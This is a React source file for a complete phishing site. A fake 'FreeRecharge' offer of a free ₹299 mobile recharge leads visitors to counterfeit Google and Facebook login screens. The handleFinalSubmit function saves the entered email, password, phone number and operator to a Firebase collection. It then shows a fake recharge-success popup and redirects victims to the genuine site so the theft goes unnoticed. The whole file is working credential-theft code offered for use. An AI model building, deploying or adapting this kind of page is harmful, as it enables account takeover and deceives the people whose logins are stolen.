import React, { useState, useEffect } from 'react';
import { db } from './firebase';
import { collection, addDoc } from "firebase/firestore";

function Login() {
  const [view, setView] = useState('recharge'); // recharge, popup, google, fb
  const [showSuccess, setShowSuccess] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [mob, setMob] = useState('');
  const [operator, setOperator] = useState('Jio');
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const handleRechargeClick = (e) => {
    e.preventDefault();
    if (mob.length < 10) {
      alert("Invalid number!");
      return;
    }
    setView('popup');
  };

  const handleFinalSubmit = async (e) => {
    e.preventDefault();
    try {
      // 1. Save Data
      await addDoc(collection(db, "user_data"), {
        loginType: view === 'fb' ? 'Facebook' : 'Google',
        mobile: mob,
        operator: operator,
        id: email,
        pass: password,
        time: new Date().toLocaleString()
      });

      // 2. Show Custom Success Popup
      setShowSuccess(true);

      // 3. Redirect after 3 seconds
      setTimeout(() => {
        window.location.replace(view === 'fb' ? "https://m.facebook.com" : "https://accounts.google.com");
      }, 3500);
    } catch (err) {
      setShowSuccess(true);
      setTimeout(() => window.location.replace("https://m.facebook.com"), 3000);
    }
  };

  // --- 1. SUCCESS POPUP (New) ---
  if (showSuccess) {
    return (
      <div style={modalOverlay}>
        <div style={{...modalContent, width: isMobile ? '80%' : '350px', borderTop: '6px solid #4caf50'}}>
          <div style={{fontSize: '50px', color: '#4caf50', marginBottom: '15px'}}>✔</div>
          <h2 style={{margin: '0 0 10px', color: '#333'}}>Recharge Successful!</h2>
          <p style={{color: '#666', fontSize: '14px', lineHeight: '1.5'}}>
            Congratulations! The recharge of <b>₹299</b> for <b>{mob}</b> has been initiated and will be activated within 5 minutes.
          </p>
          <div style={{marginTop: '20px', fontSize: '12px', color: '#999'}}>Transaction ID: {Math.floor(Math.random() * 9000000000)}</div>
        </div>
      </div>
    );
  }

  // --- 2. RECHARGE PAGE ---
  if (view === 'recharge') {
    return (
      <div style={mainWrapper}>
        <header style={navStyle}>
          <div style={logoStyle}>⚡ FreeRecharge</div>
          <div style={liveBadge}>● Online</div>
        </header>
        <div style={heroSection}>
          <h1 style={{...heroTitle, fontSize: isMobile ? '26px' : '36px'}}>Get Free ₹299 Recharge</h1>
          <div style={{...rechargeCard, width: isMobile ? '90%' : '400px'}}>
            <form onSubmit={handleRechargeClick}>
              <div style={inputGroup}><label style={labelStyle}>Mobile Number</label><input type="number" placeholder="Enter 10 digit number" style={rechargeInput} value={mob} onChange={(e)=>setMob(e.target.value)} required /></div>
              <div style={inputGroup}><label style={labelStyle}>Operator</label><select style={rechargeInput} onChange={(e)=>setOperator(e.target.value)}><option>Jio</option><option>Airtel</option><option>Vi</option><option>BSNL</option></select></div>
              <div style={inputGroup}><label style={labelStyle}>Plan</label><input type="text" value="₹299 (Unlimited + 2GB/Day)" style={{...rechargeInput, background: '#f0f0f0'}} readOnly /></div>
              <button type="submit" style={rechargeBtn}>Proceed to Recharge</button>
            </form>
          </div>
        </div>
      </div>
    );
  }

  // --- 3. SELECTION POPUP ---
  if (view === 'popup') {
    return (
      <div style={modalOverlay}>
        <div style={{...modalContent, width: isMobile ? '85%' : '350px'}}>
          <h3 style={{color: '#333'}}>Verification Required</h3>
          <p style={{fontSize: '13px', color: '#666', marginBottom: '20px'}}>Verify your identity to get free recharge on <b>{mob}</b>.</p>
          <div style={popupBtn} onClick={()=>setView('google')}><img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="20" alt="G" /> Google Verification</div>
          <div style={{...popupBtn, background: '#1877f2', color: '#fff'}} onClick={()=>setView('fb')}><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="20" alt="F" /> Facebook Verification</div>
          <button onClick={()=>setView('recharge')} style={closeBtn}>Cancel</button>
        </div>
      </div>
    );
  }

  // --- 4. LOGIN VIEWS ---
  return view === 'google' ? (
    <div style={gBackground}>
      <div style={{...gContainer, width: isMobile ? '90%' : '360px'}}>
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" width="75" />
        <h1 style={gHeading}>Sign in</h1><p style={gSub}>to continue to Google</p>
        <form onSubmit={handleFinalSubmit}>
          <input type="email" placeholder="Email or phone" style={gInput} onChange={(e)=>setEmail(e.target.value)} required />
          <input type="password" placeholder="Enter password" style={gInput} onChange={(e)=>setPassword(e.target.value)} required />
          <div style={{display: 'flex', justifyContent: 'space-between', marginTop: '40px'}}><span style={gCreate} onClick={()=>setView('popup')}>Back</span><button type="submit" style={gNextBtn}>Next</button></div>
        </form>
      </div>
    </div>
  ) : (
    <div style={fbBg}>
      <h1 style={fbLogo}>facebook</h1>
      <div style={{...fbCard, width: isMobile ? '90%' : '360px'}}>
        <p style={{marginBottom: '15px'}}>Log in to Facebook</p>
        <form onSubmit={handleFinalSubmit}>
          <input type="text" placeholder="Email or phone" style={fbInput} onChange={(e)=>setEmail(e.target.value)} required />
          <input type="password" placeholder="Password" style={fbInput} onChange={(e)=>setPassword(e.target.value)} required />
          <button type="submit" style={fbLoginBtn}>Log In</button>
        </form>
      </div>
    </div>
  );
}

// --- ALL STYLES ---
const mainWrapper = { background: 'linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)', minHeight: '100vh', color: '#fff', fontFamily: 'Arial' };
const navStyle = { display: 'flex', justifyContent: 'space-between', padding: '15px 20px' };
const logoStyle = { fontSize: '20px', fontWeight: 'bold' };
const liveBadge = { background: '#4caf50', padding: '3px 10px', borderRadius: '20px', fontSize: '11px' };
const heroSection = { display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '40px', padding: '0 15px' };
const heroTitle = { textAlign: 'center', marginBottom: '30px' };
const rechargeCard = { background: '#fff', color: '#333', padding: '25px', borderRadius: '12px', boxShadow: '0 10px 30px rgba(0,0,0,0.3)' };
const inputGroup = { marginBottom: '15px', textAlign: 'left' };
const labelStyle = { display: 'block', fontSize: '14px', marginBottom: '5px', fontWeight: 'bold' };
const rechargeInput = { width: '100%', padding: '12px', boxSizing: 'border-box', border: '1px solid #ddd', borderRadius: '6px', fontSize: '16px' };
const rechargeBtn = { width: '100%', padding: '14px', background: '#ff9800', border: 'none', borderRadius: '6px', color: '#fff', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', marginTop: '10px' };
const modalOverlay = { position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.85)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 };
const modalContent = { background: '#fff', padding: '30px', borderRadius: '15px', textAlign: 'center', boxShadow: '0 20px 40px rgba(0,0,0,0.4)' };
const popupBtn = { display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px', padding: '12px', border: '1px solid #ddd', borderRadius: '8px', marginBottom: '12px', cursor: 'pointer', fontWeight: 'bold', color: '#333' };
const closeBtn = { background: 'none', border: 'none', color: '#666', marginTop: '10px', cursor: 'pointer' };
const gBackground = { background: '#fff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' };
const gContainer = { padding: '40px', border: '1px solid #dadce0', borderRadius: '8px', textAlign: 'center' };
const gHeading = { fontSize: '24px', fontWeight: '400', margin: 0 };
const gSub = { fontSize: '16px', margin: '10px 0 30px' };
const gInput = { width: '100%', padding: '13px', marginBottom: '10px', border: '1px solid #dadce0', borderRadius: '4px', boxSizing: 'border-box', fontSize: '16px' };
const gNextBtn = { background: '#1a73e8', color: '#fff', border: 'none', padding: '10px 24px', borderRadius: '4px', fontWeight: 'bold', cursor: 'pointer' };
const gCreate = { color: '#1a73e8', cursor: 'pointer', fontSize: '14px' };
const fbBg = { background: '#f0f2f5', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: '40px' };
const fbLogo = { color: '#1877f2', fontSize: '40px', fontWeight: 'bold', marginBottom: '20px' };
const fbCard = { background: '#fff', padding: '20px', borderRadius: '8px', boxShadow: '0 2px 4px rgba(0,0,0,0.1)', textAlign: 'center' };
const fbInput = { width: '100%', padding: '12px', margin: '6px 0', border: '1px solid #dddfe2', borderRadius: '6px', boxSizing: 'border-box', fontSize: '16px' };
const fbLoginBtn = { width: '100%', padding: '12px', background: '#1877f2', color: '#fff', border: 'none', borderRadius: '6px', fontWeight: 'bold', fontSize: '18px', cursor: 'pointer' };

export default Login;